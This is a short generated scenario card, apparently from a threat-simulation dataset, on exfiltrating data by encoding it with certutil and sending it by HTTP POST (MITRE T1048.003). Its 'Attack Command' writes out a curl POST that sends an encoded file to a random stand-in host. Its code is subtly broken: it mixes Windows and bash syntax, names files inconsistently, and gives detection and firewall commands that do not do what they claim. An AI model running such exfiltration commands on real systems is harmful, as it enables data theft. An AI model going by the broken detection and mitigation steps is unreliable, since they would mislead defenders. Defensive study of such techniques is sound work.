---
type: campaign
scenario_id: 151
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using certutil to encode and exfiltrate data via HTTP POST.

## Threat Description
Using certutil to encode and exfiltrate data via HTTP POST.

## Attack Command
```
certutil -encode C:\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) $(echo enc$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).b64) && curl -X POST -d @$(echo enc$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).b64) http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com
```

## Detection Logic
Monitor certutil encoding: `wmic process where name='certutil.exe' get commandline | findstr encode`; Monitor HTTP POST: `netstat -anp | grep POST`.

## Mitigation
Restrict certutil: `icacls %windir%\System32\certutil.exe /deny Everyone:RX`; Block outbound HTTP POST: `netsh advfirewall firewall add rule name='Block POST' dir=out action=block protocol=TCP localport=80`.

## AI Training Prompt
Train AI to detect certutil encoding for exfiltration and suggest firewall rules.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
